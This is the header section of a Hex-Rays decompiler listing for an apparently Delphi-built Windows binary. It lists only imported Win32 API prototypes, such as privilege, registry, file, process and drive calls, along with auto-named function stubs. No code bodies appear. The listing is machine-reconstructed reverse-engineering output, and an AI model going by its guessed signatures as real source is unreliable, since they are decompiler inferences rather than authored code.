/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
// void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// LPSTR __stdcall CharNextA(LPCSTR lpsz);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// int __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// LCID __stdcall GetThreadLocale();
// HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// int __stdcall LoadStringA(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
// LPSTR __stdcall lstrcpynA(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// int __stdcall lstrlenA(LPCSTR lpString);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BSTR __stdcall SysAllocStringLen(const OLECHAR *strIn, UINT ui);
// INT __stdcall SysReAllocStringLen(BSTR *pbstr, const OLECHAR *psz, unsigned int len);
// void __stdcall SysFreeString(BSTR bstrString);
// LONG __stdcall InterlockedDecrement(volatile LONG *lpAddend);
// DWORD __stdcall GetCurrentThreadId();
int sub_40133C();
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
int sub_4013A0();
// _DWORD *__usercall sub_4013F0@<eax>(_DWORD *result@<eax>);
// char __usercall sub_4013F8@<al>(int *a1@<eax>, int *a2@<edx>);
// int *__usercall sub_401428@<eax>(int *result@<eax>);
// char __usercall sub_401440@<al>(int *a1@<eax>, int *a2@<edx>, int *a3@<ecx>);
// int *__usercall sub_4014B4@<eax>(int *a1@<eax>, int **a2@<edx>);
// char __usercall sub_401544@<al>(int a1@<eax>, int *a2@<edx>);
// char __usercall sub_4015A8@<al>(void *a1@<eax>, int a2@<edx>, int *a3@<ecx>);
// unsigned int *__usercall sub_401620@<eax>(unsigned int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// LPVOID __usercall sub_4016D8@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// unsigned int __usercall sub_40176C@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// int *__usercall sub_4017EC@<eax>(int a1@<eax>, int *a2@<edx>);
// int *__usercall sub_40187C@<eax>(void *a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// char __usercall sub_4019A0@<al>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
char sub_401A2C();
void sub_401AF0();
// _DWORD *__usercall sub_401BD0@<eax>(_DWORD *a1@<eax>);
// int *__usercall sub_401C34@<eax>(unsigned int a1@<eax>);
// unsigned int *__usercall sub_401C64@<eax>(unsigned int *result@<eax>, int a2@<edx>);
// int __usercall sub_401C94@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_401CB8@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// int __usercall sub_401CE0@<eax>(int a1@<eax>);
// int __usercall sub_401D50@<eax>(int *a1@<eax>);
// char __usercall sub_401D88@<al>(unsigned int *a1@<eax>, int a2@<edx>);
// char __usercall sub_401E38@<al>(unsigned int *a1@<eax>, int a2@<edx>);
int sub_401EC0();
// char __usercall sub_401F0C@<al>(unsigned int *a1@<eax>);
// int __usercall sub_401F98@<eax>(int a1@<eax>);
// int __usercall sub_401FC4@<eax>(void *a1@<eax>, int a2@<edx>);
// int __usercall sub_401FF8@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_402024@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_402118@<eax>(int a1@<eax>);
// int __usercall sub_4022A8@<eax>(int a1@<eax>);
// unsigned int __usercall sub_40244C@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_40261C@<eax>(char *a1@<eax>, int a2@<edx>);
// int __usercall sub_4026E0@<eax>(int a1@<eax>);
// int __usercall sub_402700@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_402720@<eax>(_DWORD *result@<eax>, int a2@<edx>);
int sub_402770();
// void __usercall __noreturn sub_402790(int a1@<eax>, int a2@<edx>, void *a3@<ecx>);
// void __usercall __noreturn sub_40279C(char a1@<al>, int a2@<edx>, void *a3@<ecx>);
// void __usercall __noreturn sub_4027E8(char a1@<al>, void *a2@<ecx>);
void __thiscall __spoils<ecx> sub_4027F4(void *this);
// _DWORD *__usercall sub_402814@<eax>(int a1@<eax>);
int sub_402824();
// int __usercall sub_402844@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// const CHAR *__usercall sub_402884@<eax>(LPSTR i@<eax>, char **a2@<edx>);
int sub_402970();
// const CHAR *__usercall sub_4029D0@<eax>(int a1@<eax>, char **a2@<edx>);
// unsigned __int8 __usercall sub_402A30@<al>(unsigned __int8 result@<al>);
// __int64 __usercall sub_402A3C@<edx:eax>(double a1@<st0>);
void __noreturn sub_402A48(); // weak
// int __usercall sub_402A64@<eax>(int a1@<eax>, __int16 a2@<dx>);
// int __usercall sub_402ABC@<eax>(int a1@<eax>);
// DWORD __usercall sub_402AC8@<eax>(int a1@<eax>);
int sub_402B04();
// DWORD __usercall sub_402B08@<eax>(int a1@<eax>, DWORD a2@<ecx>);
// bool __usercall sub_402B44@<al>(void *a1@<eax>);
// DWORD __usercall sub_402B54@<eax>(int a1@<eax>);
int sub_402B74(); // weak
// int __usercall sub_402D20@<eax>(int a1@<eax>, int (__thiscall *a2)(int)@<edx>, int a3@<ecx>);
// int __usercall sub_402D68@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_402D74@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_402D80@<eax>(int a1@<eax>);
// int __usercall sub_402DD8@<eax>(int result@<eax>, int a2@<edx>, unsigned int a3@<ecx>);
// __int16 __usercall sub_402E48@<ax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_402E68@<eax>(int result@<eax>, char **a2@<edx>);
// int __usercall sub_402F34@<eax>(int a1@<eax>);
// int __usercall sub_402F78@<eax>(int result@<eax>, char *a2@<edx>, signed int a3@<ecx>);
// int __usercall sub_402FCC@<eax>(int result@<eax>, signed int a2@<edx>);
// int __usercall sub_403048@<eax>(_BYTE *a1@<eax>, char *a2@<edx>);
// int __usercall sub_403054@<eax>(_BYTE *a1@<eax>, char *a2@<edx>, unsigned int a3@<ecx>);
// const void *__usercall sub_403078@<eax>(const void *result@<eax>, const void *a2@<edx>, unsigned __int8 a3@<cl>);
// int __usercall sub_40308C@<eax>(int result@<eax>);
// int __usercall sub_403094@<eax>(int result@<eax>);
// int __stdcall GetKeyboardType(int nTypeFlag);
int sub_40337C();
__int16 sub_4033AC();
int __cdecl sub_40341D(int, int); // weak
void sub_403470();
// int __usercall sub_40347C@<eax>(int a1@<eax>);
// int __usercall sub_403484@<eax>(int result@<eax>, void *a2@<edx>);
// char __usercall sub_403498@<al>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_4034C0@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_4034CC@<eax>(int a1@<eax>);
// int __usercall sub_4034E8@<eax>(int a1@<eax>);
// int __usercall sub_4034FC@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_403504@<eax>(_DWORD *result@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_403524@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_403534@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_403540@<eax>(int a1@<eax>, _DWORD *a2@<edx>);
// int __usercall sub_403598@<eax>(int result@<eax>);
// _DWORD *__usercall sub_4035B8@<eax>(_DWORD *a1@<eax>, unsigned int a2@<edx>, _DWORD *a3@<ecx>);
// _DWORD *__usercall sub_4035E8@<eax>(int *a1@<eax>, _DWORD *a2@<edx>, _DWORD *a3@<ecx>);
// _DWORD *__usercall sub_40367C@<eax>(int a1@<eax>, _DWORD *a2@<edx>);
// bool __usercall sub_4036C0@<al>(int *a1@<eax>, int a2@<edx>);
// int __usercall sub_4036E4@<eax>(int a1@<eax>, int a2@<esi>);
// void __usercall sub_403714(int *a1@<eax>, int a2@<esi>);
// char __usercall sub_40372C@<al>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_403740@<eax>(int a1@<eax>);
int sub_403748();
int nullsub_9(void); // weak
// int __usercall sub_40375C@<eax>(int *a1@<eax>, _WORD *a2@<edx>, int (*a3)(void)@<esi>);
// int *__usercall sub_403784@<eax>(int a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_4037D4@<eax>(_DWORD *result@<eax>, int a2@<edx>, _BYTE *a3@<ecx>);
// _DWORD *__usercall sub_403814@<eax>(_DWORD *result@<eax>, char *a2@<edx>);
// int __usercall sub_403864@<eax>(int result@<eax>, char a2@<dl>, char a3);
// int __usercall sub_4038B4@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_4038BC@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_4038CC@<eax>(_DWORD *result@<eax>, char a2@<dl>);
int sub_4038DC();
// void __usercall __spoils<edx,ecx> sub_4038F8(int a1@<eax>, int a2@<edx>);
// void __usercall __spoils<edx,ecx> sub_403934(int a1@<ebx>);
// void __usercall __spoils<edx,ecx> sub_403948(int a1@<ebx>);
void sub_40395C();
void __fastcall __spoils<edx,ecx> sub_40397C(int a1, int a2);
void __fastcall sub_4039A4(int a1, int a2);
void __spoils<ecx> sub_4039C0();
// int __usercall sub_4039E0@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, struct _EXCEPTION_POINTERS ExceptionInfo, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13);
int __cdecl sub_403C94(int a1, int a2);
// int __usercall sub_403CCC@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5);
int __cdecl sub_403CF4(int a1, int a2);
void __cdecl sub_403D48(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
int __stdcall sub_403D78(unsigned int a1, int a2, int a3);
void __thiscall __noreturn sub_403D90(void *this, int *a2);
int __cdecl sub_403E30(struct _EXCEPTION_POINTERS ExceptionInfo); // idb
// struct _EXCEPTION_REGISTRATION_RECORD **__usercall sub_403ED0@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<ebp>);
int sub_403EF0();
int sub_403F18();
int sub_403F78();
// int __usercall sub_403FD8@<eax>(int a1@<eax>, int a2@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *a3@<ebp>);
// int **__usercall sub_404018@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_404040@<eax>(int *a1@<eax>);
unsigned int __fastcall sub_404064(int a1);
BOOL __stdcall sub_4040C0(int a1, int a2, int a3);
void __thiscall sub_4040F0(void *this);
void __thiscall __noreturn sub_40417C(void *this);
// void __usercall __noreturn sub_404254(int a1@<eax>, void *a2@<ecx>);
void __noreturn sub_404260(void); // weak
// _DWORD *__usercall sub_40426C@<eax>(_DWORD *result@<eax>);
// int __usercall sub_404290@<eax>(int result@<eax>, int a2@<edx>);
// volatile __int32 *__usercall sub_4042C0@<eax>(volatile __int32 *result@<eax>, __int32 a2@<edx>);
// volatile __int32 *__usercall sub_404304@<eax>(volatile __int32 *result@<eax>, __int32 a2@<edx>);
// int __usercall sub_404330@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40435C@<eax>(char **a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// int __userpurge sub_40438C@<eax>(LPCWCH lpWideCharStr@<ecx>, int cbMultiByte@<edx>, CHAR *a3@<eax>, int cchWideChar);
// int __userpurge sub_4043A8@<eax>(LPCCH lpMultiByteStr@<ecx>, int cchWideChar@<edx>, WCHAR *a3@<eax>, int cbMultiByte);
// _DWORD *__usercall sub_4043C0@<eax>(int cchWideChar@<ecx>, char **a2@<eax>, const WCHAR *a3@<edx>);
// _DWORD *__usercall sub_40444C@<eax>(char **a1@<eax>);
// _DWORD *__usercall sub_40445C@<eax>(char **a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_40448C@<eax>(char **a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_4044C8@<eax>(char **a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_4044D4@<eax>(char **a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_4044EC@<eax>(char **a1@<eax>, const WCHAR *a2@<edx>);
// _BYTE *__usercall sub_404500@<eax>(_BYTE *result@<eax>, char *a2@<edx>, int a3@<ecx>);
// int __usercall sub_404524@<eax>(int result@<eax>);
// char **__usercall sub_40452C@<eax>(char **result@<eax>, __int32 a2@<edx>);
// volatile __int32 *__usercall sub_404570@<eax>(volatile __int32 *a1@<eax>, char *a2@<edx>, char *a3@<ecx>);
// volatile __int32 *__usercall sub_4045E4@<eax>(volatile __int32 *a1@<eax>, int a2@<edx>);
// int __usercall Delphi_CompareCall_404668@<eax>(int result@<eax>, int *a2@<edx>);
// int __usercall sub_40470C@<eax>(int result@<eax>);
// char *__usercall sub_40471C@<eax>(char *result@<eax>);
// char *__usercall sub_404728@<eax>(char **a1@<eax>);
// char *__usercall sub_40476C@<eax>(char **@<eax>);
// char *__usercall sub_404774@<eax>(char **@<eax>);
// _DWORD *__userpurge Delphi_Copy_40477C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4);
// char *__usercall sub_4047BC@<eax>(char **a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _BYTE *__usercall sub_404804@<eax>(_BYTE *result@<eax>, _BYTE *a2@<edx>);
// _DWORD *__usercall sub_40484C@<eax>(char **a1@<eax>, int a2@<edx>);
// int __usercall sub_4048B0@<eax>(int a1@<eax>, char *a2@<edx>, signed int a3@<ecx>);
// BSTR __usercall sub_4048D8@<eax>(BSTR result@<eax>);
// void __usercall sub_4048F0(volatile __int32 *a1@<eax>, __int32 a2@<edx>);
// OLECHAR **__usercall sub_404900@<eax>(OLECHAR **result@<eax>);
// void __usercall sub_404918(OLECHAR **a1@<eax>, int a2@<edx>);
// OLECHAR **__usercall sub_40493C@<eax>(OLECHAR **a1@<eax>, const OLECHAR *a2@<edx>);
// void __usercall sub_404960(int cbMultiByte@<ecx>, int *a2@<eax>, const CHAR *a3@<edx>);
// void __usercall sub_4049EC(UINT ui@<ecx>, OLECHAR *strIn@<edx>, OLECHAR **a3@<eax>);
// void __usercall sub_404A10(OLECHAR **a1@<eax>, OLECHAR *a2@<edx>);
// void __usercall sub_404A4C(int *a1@<eax>, const CHAR *a2@<edx>);
// __int16 *__usercall sub_404A5C@<eax>(__int16 *result@<eax>);
// int __usercall sub_404A6C@<eax>(int result@<eax>);
// int __usercall sub_404A78@<eax>(int *a1@<eax>, char *a2@<edx>);
// int __usercall sub_404AD8@<eax>(int result@<eax>, _DWORD *a2@<edx>);
// void __userpurge sub_404B5C(int a1@<eax>, int a2@<edx>, int a3@<ecx>, OLECHAR **a4);
// void __usercall sub_404BA8(int *a1@<eax>, OLECHAR *a2@<edx>);
// char __usercall sub_404BEC@<al>(int a1@<eax>, int a2@<edx>);
// char __usercall sub_404C1C@<al>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>);
// int __usercall sub_404CB0@<eax>(int a1@<eax>, int a2@<edx>);
// int *__usercall sub_404CE4@<eax>(int *result@<eax>, char *a2@<edx>, int a3@<ecx>);
// int *__usercall sub_404DD0@<eax>(int *a1@<eax>, char *a2@<edx>);
// int __usercall sub_404DDC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __userpurge sub_404EF8@<eax>(volatile __int32 *a1@<eax>, __int32 *a2@<edx>, _BYTE *a3@<ecx>, int a4);
// _DWORD *__usercall sub_404FEC@<eax>(const WCHAR *a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// _DWORD *__usercall sub_404FF8@<eax>(const WCHAR *a1@<eax>, char **a2@<edx>);
// int __usercall sub_40501C@<eax>(const CHAR *a1@<eax>);
void __thiscall __noreturn sub_405040(void *this);
// __int16 __usercall sub_405048@<ax>(unsigned __int16 *a1@<eax>, void *a2@<ecx>);
__int16 (__usercall *sub_405060())@<ax>(unsigned __int16 *a1@<eax>, void *a2@<ecx>);
// int *__usercall sub_405080@<eax>(int *result@<eax>);
// const void *__usercall sub_405094@<eax>(const void *result@<eax>);
int __stdcall sub_4050A8(_DWORD); // weak
int __fastcall sub_4050B0(_DWORD, _DWORD); // weak
int sub_4050B8(void); // weak
__int64 sub_4050C0(void); // weak
int sub_4050C8(void); // weak
double sub_4050D0(void); // weak
double sub_4050D8(void); // weak
int __fastcall sub_4050E0(_DWORD, _DWORD); // weak
int __stdcall sub_4050E8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int sub_4050F0(void); // weak
int sub_4050F8(void); // weak
int __fastcall sub_405100(_DWORD, _DWORD); // weak
int __stdcall sub_405108(int a1, int a2);
int sub_40511C(void); // weak
// int __usercall sub_405124@<eax>(double@<st0>); weak
// int __usercall sub_40512C@<eax>(double@<st0>); weak
int sub_405134(void); // weak
int __cdecl sub_40513C(_DWORD); // weak
int sub_405144(void); // weak
int sub_40514C(void); // weak
int sub_405154();
void __spoils<edx,ecx> sub_405160();
void __thiscall __noreturn sub_405168(void *this);
// int __userpurge sub_405170@<eax>(int a1@<eax>, int a2, int a3);
// int __userpurge sub_405194@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3);
// int __userpurge sub_405210@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64 a2);
// int __userpurge sub_40525C@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3);
// unsigned int __userpurge sub_4052D8@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64 a2);
// int __usercall sub_405328@<eax>(__int64 a1@<edx:eax>, char a2@<cl>);
// int __usercall sub_405348@<eax>(unsigned __int64 a1@<edx:eax>, char a2@<cl>);
// __int64 __usercall sub_405368@<edx:eax>(int a1@<eax>, int *a2@<edx>);
// int __usercall sub_40558C@<eax>(int result@<eax>);
// int __usercall sub_405594@<eax>(int a1@<eax>);
// int __userpurge sub_40559C@<eax>(volatile __int32 *a1@<eax>, __int32 *a2@<edx>, _BYTE *a3@<ecx>, int a4);
// int *__usercall sub_4055AC@<eax>(int *result@<eax>, char *@<edx>, int@<ecx>);
// int *__usercall sub_4055B4@<eax>(int *a1@<eax>, int a2@<edx>);
// int *__userpurge sub_4055BC@<eax>(int *a1@<eax>, int a2@<edx>, void *a3@<ecx>, int *a4);
// int *__usercall sub_405748@<eax>(int *a1@<eax>, int a2@<edx>, void *a3@<ecx>, int a4);
// int *__usercall sub_405754@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>);
// int *__userpurge sub_405774@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int *a4, int a5);
// int *__usercall sub_405868@<eax>(int *result@<eax>, int a2@<edx>);
// int *__usercall sub_4058A4@<eax>(int *result@<eax>, int a2@<edx>, int a3@<ecx>);
// PVOID __usercall sub_4058CC@<eax>(const void *a1@<eax>);
// int __usercall sub_4058F4@<eax>(int a1@<eax>);
// int __usercall sub_40593C@<eax>(int result@<eax>);
// const CHAR *__usercall sub_405964@<eax>(const CHAR *result@<eax>);
// int __usercall sub_405978@<eax>(CHAR *a1@<eax>, int a2@<edx>);
// HMODULE __usercall sub_405B30@<eax>(const CHAR *a1@<eax>);
// int __usercall sub_405DA0@<eax>(int a1@<eax>);
// int __usercall sub_405DA8@<eax>(int result@<eax>);
// _DWORD *__usercall sub_405DD4@<eax>(int a1@<eax>);
// int __usercall sub_405DDC@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_405DE4@<eax>(int a1@<eax>);
// int __usercall sub_405E04@<eax>(int result@<eax>);
// int __usercall sub_405E64@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_405EC0@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_405ED0@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_405F40@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_405F58@<eax>(_DWORD *result@<eax>, int a2@<edx>);
// LONG __usercall sub_405F84@<eax>(int a1@<eax>);
// int __usercall sub_405F90@<eax>(int result@<eax>, void *a2@<ecx>);
// _DWORD *__usercall sub_405FA0@<eax>(int a1@<eax>);
// unsigned int __userpurge sub_406014@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, unsigned int a4);
// int __userpurge sub_4060F0@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, unsigned int a4);
// _DWORD *__usercall sub_406234@<eax>(__int16 *a1@<eax>, volatile __int32 *a2@<edx>);
// OLECHAR **__usercall sub_4062E0@<eax>(char *a1@<eax>, OLECHAR **a2@<edx>);
// OLECHAR **__usercall sub_406384@<eax>(const CHAR *a1@<eax>, volatile __int32 *a2@<edx>);
// int **__usercall sub_4063D4@<eax>(int **result@<eax>, char **a2@<edx>);
int sub_40642C();
void sub_406480();
// HMODULE __stdcall GetModuleHandleA_0(LPCSTR lpModuleName);
// HLOCAL __stdcall LocalAlloc_0(UINT uFlags, SIZE_T uBytes);
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue);
// HLOCAL __usercall sub_406514@<eax>(SIZE_T a1@<eax>);
int sub_406520();
int sub_406528();
LPVOID sub_40656C();
_DWORD *sub_4065AC();
// int __usercall sub_4065B8@<eax>(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>);
int sub_4065FC();
void sub_40662C();
int sub_406634();
void sub_406664();
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// LSTATUS __stdcall RegCloseKey_0(HKEY hKey);
// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegDeleteKeyA(HKEY hKey, LPCSTR lpSubKey);
// LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
// LSTATUS __stdcall RegEnumKeyExA(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// LSTATUS __stdcall RegOpenKeyExA_0(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA_0(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// BOOL __stdcall CloseHandle_0(HANDLE hObject);
// int __stdcall CompareStringA(LCID Locale, DWORD dwCmpFlags, PCNZCH lpString1, int cchCount1, PCNZCH lpString2, int cchCount2);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// HANDLE __stdcall CreateFileA_0(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// void __stdcall DeleteCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// void __stdcall EnterCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall EnumCalendarInfoA(CALINFO_ENUMPROCA lpCalInfoEnumProc, LCID Locale, CALID Calendar, CALTYPE CalType);
// BOOL __stdcall FileTimeToDosDateTime(const FILETIME *lpFileTime, LPWORD lpFatDate, LPWORD lpFatTime);
// BOOL __stdcall FileTimeToLocalFileTime(const FILETIME *lpFileTime, LPFILETIME lpLocalFileTime);
// BOOL __stdcall FileTimeToSystemTime(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
// BOOL __stdcall FindClose_0(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA_0(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// BOOL __stdcall FreeLibrary_0(HMODULE hLibModule);
// UINT __stdcall GetACP();
// BOOL __stdcall GetCPInfo(UINT CodePage, LPCPINFO lpCPInfo);
// BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId_0();
// BOOL __stdcall GetDiskFreeSpaceA(LPCSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters);
// UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName);
// BOOL __stdcall GetFileTime(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
